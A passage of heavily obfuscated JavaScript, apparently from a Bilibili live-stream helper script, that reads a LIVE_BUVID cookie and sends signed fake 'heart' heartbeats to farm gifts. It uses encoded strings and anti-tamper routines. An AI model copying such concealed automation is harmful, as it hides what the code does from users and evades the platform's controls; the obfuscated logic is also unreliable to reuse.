50','\x65\x73\x4f\x78\x77\x70\x62\x43\x73\x79\x30\x3d','\x77\x71\x62\x44\x69\x69\x73\x38\x77\x72\x67\x3d','\x51\x53\x33\x44\x71\x6e\x56\x4e\x53\x6b\x4c\x43\x6f\x68\x7a\x43\x6d\x73\x4b\x45','\x62\x6d\x33\x43\x68\x38\x4f\x55\x77\x37\x6b\x3d','\x77\x36\x72\x43\x74\x45\x46\x73\x53\x43\x30\x41\x77\x71\x70\x6e\x77\x71\x44\x43\x6d\x78\x6f\x30\x4e\x77\x3d\x3d','\x77\x35\x59\x61\x77\x6f\x33\x43\x71\x38\x4f\x4f','\x77\x70\x2f\x43\x6e\x69\x63\x71\x51\x73\x4f\x48','\x43\x6b\x63\x61\x41\x38\x4b\x5a\x66\x51\x3d\x3d','\x77\x71\x58\x44\x68\x63\x4b\x47\x47\x73\x4b\x49','\x77\x72\x45\x45\x77\x36\x72\x44\x6d\x38\x4b\x77','\x65\x63\x4b\x73\x4f\x56\x42\x44','\x77\x35\x59\x6b\x77\x70\x62\x43\x70\x4d\x4b\x49','\x77\x37\x35\x54\x77\x35\x2f\x43\x6e\x44\x34\x3d','\x51\x73\x4b\x56\x77\x36\x34\x7a\x77\x70\x6f\x3d','\x77\x34\x59\x78\x77\x71\x5a\x2f\x77\x71\x73\x3d','\x77\x34\x6b\x76\x77\x6f\x7a\x43\x75\x4d\x4f\x54','\x52\x79\x62\x44\x68\x56\x46\x72','\x77\x34\x7a\x43\x6e\x31\x5a\x42\x65\x77\x3d\x3d','\x77\x34\x5a\x58\x77\x36\x66\x43\x69\x51\x55\x3d','\x77\x36\x46\x44\x77\x71\x31\x37\x77\x70\x73\x3d','\x77\x35\x54\x43\x69\x73\x4b\x43\x54\x63\x4b\x49','\x77\x36\x77\x74\x43\x6d\x63\x78','\x44\x31\x63\x55\x43\x63\x4b\x34','\x52\x73\x4b\x54\x77\x34\x34\x34\x64\x77\x3d\x3d','\x77\x34\x66\x44\x74\x63\x4b\x74\x77\x70\x59\x44','\x57\x6d\x35\x6d\x4c\x55\x55\x3d','\x77\x35\x49\x54\x77\x35\x48\x43\x6f\x63\x4b\x6a','\x77\x36\x6e\x44\x6d\x79\x4c\x43\x72\x7a\x67\x3d','\x77\x71\x48\x43\x6a\x67\x55\x51\x54\x41\x3d\x3d','\x44\x67\x51\x45\x77\x6f\x6f\x58','\x77\x37\x2f\x43\x6a\x56\x56\x6d\x5a\x51\x3d\x3d','\x77\x36\x50\x43\x6c\x55\x52\x75\x5a\x77\x3d\x3d','\x62\x63\x4b\x69\x50\x6d\x35\x35','\x54\x73\x4b\x50\x77\x34\x49\x50\x64\x51\x3d\x3d','\x54\x7a\x33\x44\x6b\x31\x52\x6a','\x77\x37\x72\x44\x74\x63\x4b\x4c\x77\x71\x63\x41','\x77\x70\x4d\x76\x62\x73\x4b\x6c\x47\x41\x3d\x3d','\x63\x4d\x4b\x54\x48\x6b\x39\x66','\x5a\x46\x39\x33\x4f\x6b\x41\x3d','\x46\x38\x4b\x4a\x77\x36\x51\x4c\x43\x51\x3d\x3d','\x77\x71\x55\x44\x62\x4d\x4b\x45\x50\x41\x3d\x3d','\x51\x47\x37\x43\x69\x4d\x4f\x78\x77\x34\x44\x43\x69\x4d\x4b\x5a\x48\x7a\x66\x43\x6e\x77\x3d\x3d','\x77\x72\x54\x44\x6d\x4d\x4b\x6d\x43\x63\x4b\x56','\x77\x34\x4a\x54\x77\x37\x50\x43\x74\x69\x67\x3d','\x77\x71\x33\x43\x6b\x63\x4f\x6f\x52\x78\x38\x3d','\x50\x6e\x54\x44\x73\x41\x39\x78\x77\x6f\x6c\x67\x4d\x38\x4f\x64\x77\x70\x77\x3d','\x4f\x44\x4c\x44\x6f\x6b\x68\x6c','\x53\x7a\x62\x43\x68\x44\x67\x73','\x77\x71\x72\x44\x73\x78\x50\x43\x6e\x54\x45\x3d','\x77\x37\x59\x4e\x77\x72\x76\x43\x76\x38\x4f\x67','\x53\x73\x4f\x42\x77\x71\x58\x43\x6f\x41\x49\x3d','\x63\x67\x33\x43\x71\x6a\x51\x76','\x5a\x63\x4b\x54\x47\x53\x78\x58','\x4c\x41\x56\x68\x44\x63\x4b\x67','\x77\x72\x66\x43\x70\x43\x2f\x44\x71\x38\x4b\x37','\x77\x71\x49\x6e\x46\x4d\x4b\x30\x77\x35\x73\x3d','\x5a\x73\x4b\x4e\x47\x48\x4e\x2b','\x66\x4d\x4b\x31\x47\x48\x78\x4e','\x66\x38\x4b\x74\x45\x6b\x6c\x35','\x77\x34\x72\x43\x6a\x38\x4b\x53\x64\x4d\x4b\x68','\x61\x73\x4b\x43\x4e\x69\x70\x4c','\x77\x6f\x4d\x30\x49\x4d\x4b\x68\x77\x36\x77\x3d','\x77\x72\x6a\x43\x6e\x6a\x59\x43\x56\x51\x3d\x3d','\x46\x4d\x4b\x4b\x77\x35\x55\x4a\x46\x77\x3d\x3d','\x48\x6e\x6e\x44\x6f\x7a\x70\x42','\x77\x35\x59\x6a\x77\x72\x7a\x43\x6b\x63\x4b\x6e','\x41\x57\x63\x70\x46\x4d\x4b\x2f','\x77\x71\x44\x44\x72\x73\x4f\x64\x77\x70\x70\x69','\x48\x68\x78\x2f\x49\x73\x4b\x4d','\x77\x72\x33\x44\x6a\x4d\x4f\x4a\x77\x72\x72\x44\x6c\x41\x3d\x3d','\x77\x34\x73\x39\x77\x6f\x66\x43\x71\x38\x4f\x73','\x77\x72\x66\x44\x76\x4d\x4b\x48\x42\x38\x4b\x36','\x65\x63\x4b\x67\x77\x36\x4d\x44\x77\x71\x77\x3d','\x77\x34\x6e\x44\x71\x38\x4b\x4f\x77\x72\x73\x39','\x52\x57\x2f\x43\x76\x4d\x4f\x51\x77\x37\x55\x3d','\x77\x6f\x6e\x44\x74\x4d\x4f\x34\x77\x6f\x78\x67','\x77\x34\x45\x53\x77\x70\x66\x43\x73\x73\x4f\x49','\x77\x6f\x38\x72\x4e\x4d\x4b\x55\x77\x36\x34\x3d','\x77\x71\x2f\x43\x6a\x67\x59\x58\x55\x41\x3d\x3d','\x50\x38\x4b\x52\x66\x38\x4f\x32\x77\x70\x63\x3d','\x4a\x4d\x4f\x32\x59\x6e\x31\x48','\x55\x38\x4f\x32\x77\x71\x58\x43\x6d\x67\x34\x3d','\x77\x34\x39\x6c\x77\x71\x44\x43\x6f\x6d\x2f\x43\x6f\x52\x38\x74\x77\x36\x5a\x48\x77\x71\x74\x34','\x54\x4d\x4b\x30\x77\x35\x6b\x72\x77\x6f\x45\x3d','\x4f\x6c\x59\x76\x4a\x73\x4b\x5a','\x48\x30\x6e\x44\x6e\x68\x56\x45','\x59\x38\x4b\x4a\x49\x44\x64\x47','\x77\x37\x6f\x4e\x77\x71\x6e\x43\x6a\x63\x4f\x75','\x77\x71\x66\x43\x70\x63\x4f\x63\x51\x7a\x63\x3d','\x77\x35\x54\x43\x69\x47\x72\x44\x6b\x73\x4f\x4a','\x77\x37\x68\x4f\x77\x6f\x78\x66\x77\x72\x4d\x3d','\x54\x63\x4f\x7a\x77\x70\x44\x43\x74\x6a\x41\x3d','\x77\x35\x73\x48\x77\x72\x45\x46\x49\x77\x3d\x3d','\x77\x37\x6f\x59\x77\x71\x46\x42\x77\x72\x41\x3d','\x77\x37\x41\x6e\x77\x36\x2f\x43\x71\x4d\x4b\x5a','\x50\x69\x39\x4c\x4a\x63\x4b\x59','\x77\x71\x48\x44\x73\x38\x4b\x2f\x49\x63\x4b\x74','\x4d\x52\x45\x33\x45\x63\x4f\x53\x77\x37\x73\x7a\x50\x73\x4f\x6a\x77\x37\x7a\x44\x6d\x73\x4f\x6e','\x77\x70\x6e\x44\x74\x54\x63\x38\x77\x6f\x63\x3d','\x77\x36\x7a\x44\x75\x68\x6a\x43\x72\x68\x6b\x3d','\x77\x72\x4c\x44\x75\x4d\x4f\x6c\x77\x6f\x4a\x49\x46\x54\x66\x43\x6d\x67\x3d\x3d','\x51\x77\x72\x43\x6a\x41\x55\x4a\x4e\x38\x4b\x66\x59\x73\x4f\x35\x51\x30\x70\x7a\x4f\x41\x3d\x3d','\x4b\x32\x59\x45\x4a\x38\x4b\x6a\x47\x68\x44\x44\x71\x57\x76\x44\x6d\x48\x67\x6b\x77\x35\x6e\x44\x71\x77\x38\x77\x49\x30\x51\x3d','\x42\x44\x63\x63\x4b\x38\x4f\x55\x77\x35\x45\x4e\x48\x4d\x4f\x79\x77\x35\x72\x44\x71\x4d\x4f\x44\x4d\x54\x63\x3d','\x57\x63\x4f\x67\x77\x6f\x66\x43\x71\x68\x58\x44\x74\x63\x4b\x4e\x77\x6f\x64\x4c\x77\x72\x35\x43\x77\x71\x38\x43','\x4d\x69\x72\x44\x73\x56\x68\x57\x56\x4d\x4b\x38\x77\x72\x34\x74\x48\x33\x6a\x44\x73\x38\x4b\x48\x77\x70\x63\x3d','\x6a\x73\x6a\x4e\x69\x61\x65\x6d\x57\x45\x4d\x69\x2e\x63\x4b\x6f\x6d\x59\x2e\x76\x36\x77\x5a\x53\x4f\x64\x3d\x3d'];(function(_0x354ef0,_0x2b5017,_0x5175af){var _0x3a8b85=function(_0x5311f1,_0x229a58,_0x6f99f5,_0xf42ab2,_0x5eb373){_0x229a58=_0x229a58>>0x8,_0x5eb373='po';var _0x1245a6='shift',_0xeb2845='push';if(_0x229a58<_0x5311f1){while(--_0x5311f1){_0xf42ab2=_0x354ef0[_0x1245a6]();if(_0x229a58===_0x5311f1){_0x229a58=_0xf42ab2;_0x6f99f5=_0x354ef0[_0x5eb373+'p']();}else if(_0x229a58&&_0x6f99f5['replace'](/[NeWEMKYwZSOd=]/g,'')===_0x229a58){_0x354ef0[_0xeb2845](_0xf42ab2);}}_0x354ef0[_0xeb2845](_0x354ef0[_0x1245a6]());}return 0x4042f;};var _0x30a178=function(){var _0x502bdf={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x2b51d6,_0x4bdb18,_0x555839,_0x20e6a3){_0x20e6a3=_0x20e6a3||{};var _0x5a5f2f=_0x4bdb18+'='+_0x555839;var _0x2ef9f7=0x0;for(var _0x2ef9f7=0x0,_0x17ea4c=_0x2b51d6['length'];_0x2ef9f7<_0x17ea4c;_0x2ef9f7++){var _0x2ec569=_0x2b51d6[_0x2ef9f7];_0x5a5f2f+=';\x20'+_0x2ec569;var _0x78e551=_0x2b51d6[_0x2ec569];_0x2b51d6['push'](_0x78e551);_0x17ea4c=_0x2b51d6['length'];if(_0x78e551!==!![]){_0x5a5f2f+='='+_0x78e551;}}_0x20e6a3['cookie']=_0x5a5f2f;},'removeCookie':function(){return'dev';},'getCookie':function(_0x4b76e2,_0x230d00){_0x4b76e2=_0x4b76e2||function(_0x27c1e2){return _0x27c1e2;};var _0x24e3cd=_0x4b76e2(new RegExp('(?:^|;\x20)'+_0x230d00['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x42989d=typeof _0xodB=='undefined'?'undefined':_0xodB,_0x36727c=_0x42989d['split'](''),_0x4dca10=_0x36727c['length'],_0x2c8e7d=_0x4dca10-0xe,_0x2010ee;while(_0x2010ee=_0x36727c['pop']()){_0x4dca10&&(_0x2c8e7d+=_0x2010ee['charCodeAt']());}var _0x452fa8=function(_0x57bbc7,_0x2c27db,_0xe41f86){_0x57bbc7(++_0x2c27db,_0xe41f86);};_0x2c8e7d^-_0x4dca10===-0x524&&(_0x2010ee=_0x2c8e7d)&&_0x452fa8(_0x3a8b85,_0x2b5017,_0x5175af);return _0x2010ee>>0x2===0x14b&&_0x24e3cd?decodeURIComponent(_0x24e3cd[0x1]):undefined;}};var _0xf5deea=function(){var _0x51254b=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x51254b['test'](_0x502bdf['removeCookie']['toString']());};_0x502bdf['updateCookie']=_0xf5deea;var _0x4e0196='';var _0x60cdef=_0x502bdf['updateCookie']();if(!_0x60cdef){_0x502bdf['setCookie'](['*'],'counter',0x1);}else if(_0x60cdef){_0x4e0196=_0x502bdf['getCookie'](null,'counter');}else{_0x502bdf['removeCookie']();}};_0x30a178();}(_0x5e12,0x193,0x19300));var _0x3d94=function(_0x1d1498,_0x35446){_0x1d1498=~~'0x'['concat'](_0x1d1498);var _0x2a6dfb=_0x5e12[_0x1d1498];if(_0x3d94['zVRJhx']===undefined){(function(){var _0x4c4b93=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x25d22c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4c4b93['atob']||(_0x4c4b93['atob']=function(_0x5e2f86){var _0x41cca1=String(_0x5e2f86)['replace'](/=+$/,'');for(var _0x457872=0x0,_0x29445a,_0x531fdb,_0x285caa=0x0,_0x185935='';_0x531fdb=_0x41cca1['charAt'](_0x285caa++);~_0x531fdb&&(_0x29445a=_0x457872%0x4?_0x29445a*0x40+_0x531fdb:_0x531fdb,_0x457872++%0x4)?_0x185935+=String['fromCharCode'](0xff&_0x29445a>>(-0x2*_0x457872&0x6)):0x0){_0x531fdb=_0x25d22c['indexOf'](_0x531fdb);}return _0x185935;});}());var _0x5492cc=function(_0x5eb5ce,_0x35446){var _0x4bc4b1=[],_0x126dfc=0x0,_0x5d3ad5,_0x1cbc76='',_0x265f10='';_0x5eb5ce=atob(_0x5eb5ce);for(var _0x2ad1ca=0x0,_0x1dafe8=_0x5eb5ce['length'];_0x2ad1ca<_0x1dafe8;_0x2ad1ca++){_0x265f10+='%'+('00'+_0x5eb5ce['charCodeAt'](_0x2ad1ca)['toString'](0x10))['slice'](-0x2);}_0x5eb5ce=decodeURIComponent(_0x265f10);for(var _0x5a3249=0x0;_0x5a3249<0x100;_0x5a3249++){_0x4bc4b1[_0x5a3249]=_0x5a3249;}for(_0x5a3249=0x0;_0x5a3249<0x100;_0x5a3249++){_0x126dfc=(_0x126dfc+_0x4bc4b1[_0x5a3249]+_0x35446['charCodeAt'](_0x5a3249%_0x35446['length']))%0x100;_0x5d3ad5=_0x4bc4b1[_0x5a3249];_0x4bc4b1[_0x5a3249]=_0x4bc4b1[_0x126dfc];_0x4bc4b1[_0x126dfc]=_0x5d3ad5;}_0x5a3249=0x0;_0x126dfc=0x0;for(var _0x2b3f80=0x0;_0x2b3f80<_0x5eb5ce['length'];_0x2b3f80++){_0x5a3249=(_0x5a3249+0x1)%0x100;_0x126dfc=(_0x126dfc+_0x4bc4b1[_0x5a3249])%0x100;_0x5d3ad5=_0x4bc4b1[_0x5a3249];_0x4bc4b1[_0x5a3249]=_0x4bc4b1[_0x126dfc];_0x4bc4b1[_0x126dfc]=_0x5d3ad5;_0x1cbc76+=String['fromCharCode'](_0x5eb5ce['charCodeAt'](_0x2b3f80)^_0x4bc4b1[(_0x4bc4b1[_0x5a3249]+_0x4bc4b1[_0x126dfc])%0x100]);}return _0x1cbc76;};_0x3d94['VsWpyr']=_0x5492cc;_0x3d94['UYYMjl']={};_0x3d94['zVRJhx']=!![];}var _0x4e409e=_0x3d94['UYYMjl'][_0x1d1498];if(_0x4e409e===undefined){if(_0x3d94['AbIPMN']===undefined){var _0x3917ae=function(_0x1d6d5f){this['ALVtZM']=_0x1d6d5f;this['uKXNih']=[0x1,0x0,0x0];this['vSvSDx']=function(){return'newState';};this['WxKUZH']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['ZfToDI']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x3917ae['prototype']['ndOFTF']=function(){var _0x1b87cd=new RegExp(this['WxKUZH']+this['ZfToDI']);var _0x40e29f=_0x1b87cd['test'](this['vSvSDx']['toString']())?--this['uKXNih'][0x1]:--this['uKXNih'][0x0];return this['qrbLOZ'](_0x40e29f);};_0x3917ae['prototype']['qrbLOZ']=function(_0x1d6d2b){if(!Boolean(~_0x1d6d2b)){return _0x1d6d2b;}return this['grLDbt'](this['ALVtZM']);};_0x3917ae['prototype']['grLDbt']=function(_0x357b38){for(var _0x3c6430=0x0,_0x2b7a57=this['uKXNih']['length'];_0x3c6430<_0x2b7a57;_0x3c6430++){this['uKXNih']['push'](Math['round'](Math['random']()));_0x2b7a57=this['uKXNih']['length'];}return _0x357b38(this['uKXNih'][0x0]);};new _0x3917ae(_0x3d94)['ndOFTF']();_0x3d94['AbIPMN']=!![];}_0x2a6dfb=_0x3d94['VsWpyr'](_0x2a6dfb,_0x35446);_0x3d94['UYYMjl'][_0x1d1498]=_0x2a6dfb;}else{_0x2a6dfb=_0x4e409e;}return _0x2a6dfb;};var _0x237a15=function(){var _0x1ec9bd=!![];return function(_0x4ecd31,_0x1d751a){var _0x4a4c2e=_0x1ec9bd?function(){if(_0x1d751a){var _0x35f76d=_0x1d751a['apply'](_0x4ecd31,arguments);_0x1d751a=null;return _0x35f76d;}}:function(){};_0x1ec9bd=![];return _0x4a4c2e;};}();var _0x29f2e1=_0x237a15(this,function(){var _0x196350=function(){return'\x64\x65\x76';},_0xa608e0=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x5866b7=function(){var _0x3cb914=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x3cb914['\x74\x65\x73\x74'](_0x196350['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x7a10cd=function(){var _0x41e146=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x41e146['\x74\x65\x73\x74'](_0xa608e0['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x251a86=function(_0x28f062){var _0x57e781=~-0x1>>0x1+0xff%0x0;if(_0x28f062['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x57e781)){_0x3655d4(_0x28f062);}};var _0x3655d4=function(_0x15c28c){var _0x4fef7f=~-0x4>>0x1+0xff%0x0;if(_0x15c28c['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x4fef7f){_0x251a86(_0x15c28c);}};if(!_0x5866b7()){if(!_0x7a10cd()){_0x251a86('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x251a86('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x251a86('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x29f2e1();const UUID=()=>'\x78\x78\x78\x78\x78\x78\x78\x78\x2d\x78\x78\x78\x78\x2d\x34\x78\x78\x78\x2d\x79\x78\x78\x78\x2d\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78'[_0x3d94('0','\x43\x29\x5d\x66')](/[xy]/g,function(_0x25fbd8){var _0x32b796={'\x6c\x55\x71\x43\x78':function(_0x1ff111,_0x116295){return _0x1ff111|_0x116295;},'\x6b\x45\x52\x54\x45':function(_0x21288f,_0x5e9115){return _0x21288f*_0x5e9115;},'\x6a\x50\x67\x44\x62':function(_0x186670,_0x388b7a){return _0x186670===_0x388b7a;},'\x53\x6f\x57\x5a\x64':function(_0x34a91a,_0x42e4ed){return _0x34a91a|_0x42e4ed;},'\x47\x7a\x77\x6a\x6a':function(_0x7f6b03,_0x179e1c){return _0x7f6b03&_0x179e1c;}};var _0x3defae=_0x32b796[_0x3d94('1','\x65\x4f\x21\x7a')](_0x32b796[_0x3d94('2','\x6e\x48\x77\x36')](0x10,Math['\x72\x61\x6e\x64\x6f\x6d']()),0x0);return(_0x32b796[_0x3d94('3','\x21\x78\x7a\x54')]('\x78',_0x25fbd8)?_0x3defae:_0x32b796[_0x3d94('4','\x51\x75\x6e\x4d')](_0x32b796[_0x3d94('5','\x43\x79\x71\x48')](0x3,_0x3defae),0x8))['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0x10);});class HeartGiftRoom{constructor(_0x59d60d){var _0x5c749d={'\x70\x46\x52\x79\x4c':_0x3d94('6','\x6f\x51\x44\x76'),'\x43\x59\x66\x54\x77':function(_0x22888b,_0x305637){return _0x22888b(_0x305637);},'\x50\x75\x61\x4a\x45':'\x4c\x49\x56\x45\x5f\x42\x55\x56\x49\x44','\x70\x53\x72\x59\x72':function(_0xd24b65){return _0xd24b65();}};var _0x42d4bc=_0x5c749d[_0x3d94('7','\x43\x29\x5d\x66')][_0x3d94('8','\x39\x46\x26\x44')]('\x7c'),_0xb0c5cc=0x0;while(!![]){switch(_0x42d4bc[_0xb0c5cc++]){case'\x30':;continue;case'\x31':this['\x75\x61']=window&&window[_0x3d94('9','\x30\x69\x57\x42')]?window['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72'][_0x3d94('a','\x39\x2a\x72\x56')]:'';continue;case'\x32':this[_0x3d94('b','\x21\x78\x7a\x54')]=_0x59d60d[_0x3d94('c','\x38\x67\x4e\x79')];continue;case'\x33':this[_0x3d94('d','\x31\x79\x25\x2a')]=0x0;continue;case'\x34':this[_0x3d94('e','\x42\x4c\x4a\x4a')]();continue;case'\x35':this[_0x3d94('f','\x6f\x4d\x61\x44')]=_0x5c749d['\x43\x59\x66\x54\x77'](getCookie,_0x5c749d[_0x3d94('10','\x30\x57\x28\x24')]);continue;case'\x36':this['\x6c\x61\x73\x74\x5f\x74\x69\x6d\x65']=new Date();continue;case'\x37':this[_0x3d94('11','\x43\x29\x5d\x66')]=_0x59d60d[_0x3d94('12','\x35\x70\x35\x57')];continue;case'\x38':this[_0x3d94('13','\x40\x61\x26\x6d')]=_0x5c749d[_0x3d94('14','\x24\x59\x36\x72')](UUID);continue;case'\x39':this['\x73\x65\x71']=0x0;continue;case'\x31\x30':this[_0x3d94('15','\x42\x5b\x76\x65')]=_0x59d60d;continue;case'\x31\x31':this['\x61\x72\x65\x61\x5f\x69\x64']=_0x59d60d[_0x3d94('16','\x39\x2a\x72\x56')];continue;}break;}}async[_0x3d94('17','\x5a\x59\x4f\x54')](){var _0x2a0f31={'\x50\x7a\x43\x7a\x75':function(_0x1af90f,_0x497e17){return _0x1af90f!==_0x497e17;},'\x72\x71\x4c\x55\x6f':'\x7a\x63\x59\x78\x74','\x68\x72\x56\x47\x4d':'\x66\x61\x74\x6e\x4f','\x44\x6a\x41\x50\x4b':function(_0x104d5d,_0x3baba5){return _0x104d5d>_0x3baba5;},'\x50\x6f\x61\x70\x6d':function(_0x3f5824,_0x1cbd42){return _0x3f5824==_0x1cbd42;},'\x43\x54\x73\x6d\x4f':_0x3d94('18','\x63\x26\x53\x39'),'\x63\x41\x56\x55\x53':function(_0xb08b62,_0x585d18,_0x3039e0){return _0xb08b62(_0x585d18,_0x3039e0);},'\x71\x65\x77\x67\x75':function(_0x13f96d,_0x527410){return _0x13f96d*_0x527410;},'\x48\x58\x73\x51\x61':function(_0x28dda8,_0x1c6a0c,_0x564e9d){return _0x28dda8(_0x1c6a0c,_0x564e9d);}};try{if(_0x2a0f31[_0x3d94('19','\x30\x57\x28\x24')](_0x2a0f31[_0x3d94('1a','\x79\x49\x51\x23')],_0x2a0f31[_0x3d94('1b','\x28\x52\x36\x6a')])){if(!HeartGift[_0x3d94('1c','\x53\x43\x5d\x55')]||_0x2a0f31[_0x3d94('1d','\x4e\x39\x50\x38')](this[_0x3d94('1e','\x78\x43\x42\x43')],0x3))return;let _0x3991cc={'\x69\x64':[this[_0x3d94('1f','\x6a\x24\x33\x49')],this['\x61\x72\x65\x61\x5f\x69\x64'],this[_0x3d94('20','\x42\x5b\x76\x65')],this[_0x3d94('21','\x39\x46\x26\x44')]],'\x64\x65\x76\x69\x63\x65':[this[_0x3d94('22','\x35\x70\x35\x57')],this['\x75\x75\x69\x64']],'\x74\x73':new Date()[_0x3d94('23','\x64\x58\x4c\x72')](),'\x69\x73\x5f\x70\x61\x74\x63\x68':0x0,'\x68\x65\x61\x72\x74\x5f\x62\x65\x61\x74':[],'\x75\x61':this['\x75\x61']};KeySign[_0x3d94('24','\x4e\x39\x50\x38')](_0x3991cc);let _0x52db39=await BiliPushUtils['\x41\x50\x49']['\x48\x65\x61\x72\x74\x47\x69\x66\x74']['\x65\x6e\x74\x65\x72'](_0x3991cc);if(_0x2a0f31[_0x3d94('25','\x24\x70\x59\x5b')](_0x52db39[_0x3d94('26','\x6f\x4d\x61\x44')],0x0)){var _0xed0c9d=_0x2a0f31['\x43\x54\x73\x6d\x4f'][_0x3d94('27','\x40\x61\x26\x6d')]('\x7c'),_0x31aa03=0x0;while(!![]){switch(_0xed0c9d[_0x31aa03++]){case'\x30':this['\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b']=_0x52db39[_0x3d94('28','\x40\x61\x26\x6d')][_0x3d94('29','\x30\x69\x57\x42')];continue;case'\x31':this[_0x3d94('2a','\x31\x79\x25\x2a')]=_0x52db39[_0x3d94('2b','\x35\x70\x35\x57')][_0x3d94('2c','\x48\x49\x75\x59')];continue;case'\x32':this[_0x3d94('2d','\x48\x53\x4a\x79')]=_0x52db39[_0x3d94('2e','\x24\x70\x59\x5b')][_0x3d94('2f','\x43\x29\x5d\x66')];continue;case'\x33':this['\x65\x74\x73']=_0x52db39['\x64\x61\x74\x61'][_0x3d94('30','\x38\x67\x4e\x79')];continue;case'\x34':++this[_0x3d94('31','\x65\x4f\x21\x7a')];continue;}break;}}await _0x2a0f31[_0x3d94('32','\x42\x4c\x4a\x4a')](delayCall,()=>this['\x68\x65\x61\x72\x74\x50\x72\x6f\x63\x65\x73\x73'](),_0x2a0f31[_0x3d94('33','\x4d\x40\x49\x4d')](this['\x74\x69\x6d\x65'],0x3e8));}else{l-=0x1;}}catch(_0x414d20){this['\x65\x72\x72\x6f\x72']++;console[_0x3d94('34','\x24\x59\x36\x72')](_0x414d20);await _0x2a0f31[_0x3d94('35','\x48\x49\x75\x59')](delayCall,()=>this[_0x3d94('36','\x7a\x55\x43\x53')](),0x3e8);}}async['\x68\x65\x61\x72\x74\x50\x72\x6f\x63\x65\x73\x73'](){var _0x1a59dd={'\x6a\x43\x6c\x69\x4d':function(_0x2b4339,_0x16fd87){return _0x2b4339<_0x16fd87;},'\x6c\x57\x73\x41\x56':function(_0x361c92,_0x5c575e){return _0x361c92|_0x5c575e;},'\x6e\x50\x6c\x6a\x5a':function(_0x448668,_0x4d4053){return _0x448668<<_0x4d4053;},'\x79\x4d\x74\x57\x67':function(_0x4fca10,_0x32afb2){return _0x4fca10&_0x32afb2;},'\x74\x58\x78\x70\x50':function(_0x28251a,_0x184c77){return _0x28251a|_0x184c77;},'\x4f\x74\x62\x53\x57':function(_0x2c0486,_0xbb0537){return _0x2c0486<<_0xbb0537;},'\x44\x6d\x49\x59\x5a':function(_0x1f8f2e,_0x2b04e2){return _0x1f8f2e>=_0x2b04e2;},'\x64\x46\x59\x50\x70':function(_0x39b859,_0x58ab7a){return _0x39b859|_0x58ab7a;},'\x70\x64\x62\x58\x52':function(_0x245240,_0x4a0430){return _0x245240|_0x4a0430;},'\x44\x74\x78\x57\x62':function(_0x31ecde,_0x187929){return _0x31ecde<<_0x187929;},'\x73\x41\x58\x68\x51':function(_0x53db46,_0x17f45b){return _0x53db46<<_0x17f45b;},'\x6e\x47\x6a\x65\x52':function(_0x1478d5,_0x402fac){return _0x1478d5+_0x402fac;},'\x79\x46\x69\x61\x49':function(_0x642f9e,_0x3353eb){return _0x642f9e>>_0x3353eb;},'\x44\x58\x51\x73\x63':function(_0x5a720b,_0x2db875){return _0x5a720b+_0x2db875;},'\x57\x57\x75\x63\x74':function(_0xdc609b,_0x4424ca){return _0xdc609b&_0x4424ca;},'\x61\x4a\x4f\x65\x59':function(_0x3eb580,_0x1d6060){return _0x3eb580(_0x1d6060);},'\x75\x79\x43\x42\x64':function(_0x1d5673,_0x15e4b2){return _0x1d5673(_0x15e4b2);},'\x56\x52\x51\x45\x67':function(_0x5b12fb,_0xf24c5){return _0x5b12fb===_0xf24c5;},'\x58\x4a\x41\x77\x6e':function(_0x54266f,_0x3a6301,_0x207180){return _0x54266f(_0x3a6301,_0x207180);},'\x76\x70\x53\x6c\x6b':function(_0x404702,_0xcdde0,_0x423ee0){return _0x404702(_0xcdde0,_0x423ee0);},'\x6b\x70\x53\x6b\x52':function(_0xc17c84){return _0xc17c84();},'\x4c\x48\x47\x50\x4f':function(_0x3924dd,_0x3ce232){return _0x3924dd*_0x3ce232;},'\x70\x6e\x4a\x62\x4a':function(_0x4cf9f3,_0x462c63){return _0x4cf9f3*_0x462c63;},'\x4e\x50\x7a\x68\x6d':function(_0x5bb584,_0x1455d0){return _0x5bb584+_0x1455d0;},'\x58\x52\x58\x4f\x47':function(_0x4b1459,_0x26887f){return _0x4b1459/_0x26887f;},'\x7a\x49\x55\x61\x43':function(_0x335dea,_0x490c57){return _0x335dea/_0x490c57;},'\x75\x61\x55\x6a\x79':function(_0x49ac06,_0x2bc6b6){return _0x49ac06*_0x2bc6b6;},'\x5a\x57\x6a\x6a\x66':function(_0x4c45ca,_0x584f6e){return _0x4c45ca*_0x584f6e;},'\x53\x78\x75\x4b\x79':function(_0x24d059,_0x2fc0db){return _0x24d059>_0x2fc0db;},'\x74\x76\x63\x56\x72':function(_0x1dc874,_0x5435ae){return _0x1dc874!==_0x5435ae;},'\x51\x70\x44\x67\x41':_0x3d94('37','\x66\x5a\x29\x53'),'\x63\x76\x42\x6c\x4e':function(_0x419e6a,_0x163119){return _0x419e6a==_0x163119;},'\x6a\x4c\x43\x7a\x58':function(_0x1b304d,_0x27a49c){return _0x1b304d<=_0x27a49c;},'\x79\x4d\x77\x64\x61':function(_0x5a6964,_0x27be15){return 